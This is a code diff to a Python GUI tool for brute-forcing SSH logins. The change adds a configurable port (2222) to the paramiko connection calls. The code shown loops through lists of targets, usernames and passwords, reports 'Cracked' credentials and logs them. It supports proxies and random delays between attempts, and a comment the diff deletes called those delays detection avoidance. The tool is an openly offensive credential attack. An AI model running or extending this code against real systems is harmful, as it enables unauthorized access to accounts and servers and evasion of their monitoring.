@@ -13,6 +13,7 @@ import base64
 from io import BytesIO
 from PIL import Image
 
+port=2222
 
 base64_logo = """iVBORw0KGgoAAAANSUhEUgAAAWcAAABjCAIAAADIPFZ4AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAg
 AElEQVR4nJS9abRt2VUe9n1r7XPufa9evVeNSqW2SgKhxthYIFpZAtMK4waDkUNsRhIyhiGQ2FFi
@@ -617,19 +618,19 @@ class SSHBruteforceWorker(QThread):
             for target in self.targets:
                 for username in self.usernames:
                     for password in self.passwords:
-                        executor.submit(self.ssh_bruteforce, target, username, password)
+                        executor.submit(self.ssh_bruteforce, target, username, password, port)
         self.status.emit("[*] SSH Bruteforce completed.")
 
-    def ssh_bruteforce(self, target, username, password):
+    def ssh_bruteforce(self, target, username, password, port):
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         attempt = 0
         while attempt < self.retries:
             try:
                 if self.proxy:
-                    ssh.connect(target, username=username, password=password, timeout=self.timeout, sock=self.proxy)
+                    ssh.connect(target, port=port, username=username, password=password, timeout=self.timeout, sock=self.proxy)
                 else:
-                    ssh.connect(target, username=username, password=password, timeout=self.timeout)
+                    ssh.connect(target, port=port, username=username, password=password, timeout=self.timeout)
                 message = f"[+] Cracked: {username}@{target} with password: {password}"
                 self.status.emit(message)
                 logging.info(message)
@@ -656,7 +657,7 @@ class SSHBruteforceWorker(QThread):
                 break
             finally:
                 ssh.close()
-            time.sleep(uniform(0.5, 1.5))  # Detection avoidance with random delays
+            time.sleep(uniform(0.5, 1.5))
         self.completed_tasks += 1
         progress_percent = int((self.completed_tasks / self.total_tasks) * 100)
         self.progress.emit(progress_percent)
@@ -936,4 +937,3 @@ if __name__ == '__main__':
     app = QApplication(sys.argv)
     window = SSHBruteforceGUI()
     sys.exit(app.exec_())
-
